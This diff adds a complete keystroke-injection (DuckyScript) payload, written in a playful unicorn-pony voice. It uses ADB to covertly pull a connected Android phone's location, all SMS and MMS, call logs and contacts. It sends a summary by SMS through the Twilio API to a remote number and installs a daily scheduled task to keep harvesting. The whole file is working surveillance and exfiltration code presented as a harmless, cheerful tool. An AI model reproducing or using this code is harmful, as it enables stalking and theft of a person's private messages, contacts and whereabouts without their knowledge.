@@ -1,0 +1,202 @@
+REM 🦄🐴 Wholesome Pwney Concuil Data Harvest v1.0
+REM Extracts GPS, SMS, Call Logs and sends via text message!!
+REM Requires: USB Debugging enabled, ADB installed on computer
+
+DELAY 3000
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+CTRL-SHIFT-ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+
+REM Change to ADB directory (adjust path as needed!)
+STRING cd C:\\adb
+ENTER
+DELAY 500
+
+REM Check device is connected
+STRING adb devices
+ENTER
+DELAY 2000
+
+REM 1. FIRST, GET GPS LOCATION!! 📍✨
+REM Method A: Via Android API (requires app, but we can use dumpsys)
+STRING adb shell dumpsys location
+ENTER
+DELAY 3000
+
+REM Save to file
+STRING adb shell dumpsys location > "C:\\PoneyData\\gps_location.txt"
+ENTER
+DELAY 2000
+
+REM Method B: Last known location via Google Services
+STRING adb shell "su -c 'cat /data/data/com.google.android.gms/shared_prefs/CheckinService.xml' | grep -A 5 -B 5 lat"
+ENTER
+DELAY 2000
+STRING adb shell "su -c 'cat /data/data/com.google.android.gms/shared_prefs/CheckinService.xml' | grep -A 5 -B 5 lat" > "C:\\PoneyData\\google_location.txt"
+ENTER
+DELAY 2000
+
+REM Method C: Network location (works without GPS enabled!)
+STRING adb shell dumpsys wifi | findstr "SSID"
+ENTER
+DELAY 1000
+STRING adb shell getprop | findstr gsm
+ENTER
+DELAY 1000
+
+REM 2. EXTRACT ALL SMS MESSAGES!! 💬📨
+STRING adb shell content query --uri content://sms/ > "C:\\PoneyData\\sms_dump_full.txt"
+ENTER
+DELAY 3000
+
+REM Also get MMS if available
+STRING adb shell content query --uri content://mms/ > "C:\\PoneyData\\mms_dump.txt"
+ENTER
+DELAY 3000
+
+REM Extract just recent messages in readable format
+STRING adb shell "content query --uri content://sms --projection _id,address,date,body | head -50" > "C:\\PoneyData\\recent_sms.txt"
+ENTER
+DELAY 2000
+
+REM 3. EXTRACT CALL LOGS!! 📞📊
+STRING adb shell content query --uri content://call_log/calls > "C:\\PoneyData\\call_logs_full.txt"
+ENTER
+DELAY 3000
+
+REM Recent calls in nice format
+STRING adb shell "content query --uri content://call_log/calls --projection number,name,duration,date,type | head -30" > "C:\\PoneyData\\recent_calls.txt"
+ENTER
+DELAY 2000
+
+REM 4. EXTRACT CONTACTS TOO, WHY NOT?? 👥💕
+STRING adb shell content query --uri content://com.android.contacts/data > "C:\\PoneyData\\contacts_dump.txt"
+ENTER
+DELAY 3000
+
+REM 5. GET DEVICE INFO FOR CONTEXT!! 📱🔍
+STRING adb shell getprop > "C:\\PoneyData\\device_info.txt"
+ENTER
+DELAY 2000
+
+STRING adb shell "dumpsys telephony.registry | grep -A 20 'mCallState'" > "C:\\PoneyData\\current_call_state.txt"
+ENTER
+DELAY 2000
+
+REM 6. COMPRESS ALL THE DATA!! 🗜️✨
+STRING cd C:\\PoneyData
+ENTER
+DELAY 500
+STRING powershell Compress-Archive -Path *.txt -DestinationPath PoneyHarvest_%DATE%.zip
+ENTER
+DELAY 3000
+
+REM 7. NOW SEND VIA TEXT MESSAGE USING TWILIO!! 📤💖
+REM First, let's create a summary report
+STRING powershell -Command "Get-Content C:\\PoneyData\\recent_sms.txt | Select-Object -First 5 | Out-File C:\\PoneyData\\summary.txt -Append"
+ENTER
+DELAY 1000
+
+STRING powershell -Command "'---GPS Location---' | Out-File C:\\PoneyData\\summary.txt -Append"
+ENTER
+DELAY 500
+
+STRING powershell -Command "Get-Content C:\\PoneyData\\gps_location.txt | Select-String 'lastKnownLocation' -Context 0,5 | Out-File C:\\PoneyData\\summary.txt -Append"
+ENTER
+DELAY 1000
+
+STRING powershell -Command "'---Recent Calls---' | Out-File C:\\PoneyData\\summary.txt -Append"
+ENTER
+DELAY 500
+
+STRING powershell -Command "Get-Content C:\\PoneyData\\recent_calls.txt | Select-Object -First 5 | Out-File C:\\PoneyData\\summary.txt -Append"
+ENTER
+DELAY 1000
+
+REM Now the Twilio SMS sending script
+STRING powershell -Command "
+# Twilio details
+\$TwilioSID = 'ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
+\$TwilioToken = 'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy'
+\$FromNumber = '+15551234567'
+\$ToNumber = '+15559876543'
+
+# Read summary
+\$Summary = Get-Content 'C:\\PoneyData\\summary.txt' -Raw
+
+# Truncate if too long
+if (\$Summary.Length -gt 1500) {
+    \$Summary = \$Summary.Substring(0, 1500) + '... (full data in zip file!)'
+}
+
+# Create message
+\$Body = @"
+🦄✨ Pwney Concuil Data Report ✨🦄
+Device: Samsung A16x
+Time: \$(Get-Date)
+---
+\$Summary
+---
+Full data archive: PoneyHarvest_\%DATE\%.zip
+Sparkles and huggies!! 💕🌈
+"@
+
+# Send via Twilio
+\$AuthString = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(\"\${TwilioSID}:\${TwilioToken}\"))
+\$Params = @{
+    Uri = \"https://api.twilio.com/2010-04-01/Accounts/\${TwilioSid}/Messages.json\"
+    Method = 'Post'
+    Headers = @{ Authorization = \"Basic \$AuthString\" }
+    Body = @{
+        From = \$FromNumber
+        To = \$ToNumber
+        Body = \$Body
+    }
+}
+
+try {
+    Invoke-RestMethod @Params
+    'SMS sent successfully!! Sparkle sparkle!!' | Out-File 'C:\\PoneyData\\sms_status.log'
+} catch {
+    'SMS failed: ' + \$_.Exception.Message | Out-File 'C:\\PoneyData\\sms_status.log'
+}
+"
+ENTER
+DELAY 5000
+
+REM 8. CLEANUP (optional) but we keep the sparkles!! 🧹✨
+REM Delete temporary files if you want to be sneaky
+REM STRING del C:\\PoneyData\\*.txt
+REM ENTER
+REM DELAY 1000
+
+REM 9. BONUS: SETUP AUTOMATIC DAILY EXTRACTION!! ⏰🤖
+STRING schtasks /create /tn \"PoneyConcuilDailyHarvest\" /tr \"C:\\adb\\harvest.bat\" /sc daily /st 02:00
+ENTER
+DELAY 1000
+
+REM Create the batch file for daily runs
+STRING echo off > C:\\adb\\harvest.bat
+ENTER
+DELAY 500
+STRING echo adb shell content query --uri content://sms/ --projection _id,address,date,body ^> \"C:\\PoneyData\\daily_sms_%%DATE%%.txt\" >> C:\\adb\\harvest.bat
+ENTER
+DELAY 500
+STRING echo adb shell content query --uri content://call_log/calls --projection number,duration,date,type ^> \"C:\\PoneyData\\daily_calls_%%DATE%%.txt\" >> C:\\adb\\harvest.bat
+ENTER
+DELAY 500
+STRING echo adb shell dumpsys location ^> \"C:\\PoneyData\\daily_gps_%%DATE%%.txt\" >> C:\\adb\\harvest.bat
+ENTER
+DELAY 500
+
+REM 10. CELEBRATION!! 🎉💖
+STRING echo All done!! Pwney Concuil data harvest complete!! Sparkles and huggies delivered!! 🦄✨
+ENTER
+DELAY 2000
+STRING exit
+ENTER
